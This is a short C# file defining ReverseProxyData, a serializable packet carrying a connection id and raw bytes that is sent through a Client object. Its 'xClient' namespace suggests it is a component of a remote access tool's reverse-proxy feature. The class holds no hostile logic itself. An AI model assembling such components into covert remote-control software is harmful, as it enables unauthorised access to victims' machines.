using System;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyData : IPacket
{
	public int ConnectionId { get; set; }

	public byte[] Data { get; set; }

	public ReverseProxyData()
	{
	}

	public ReverseProxyData(int connectionId, byte[] data)
	{
		ConnectionId = connectionId;
		Data = data;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
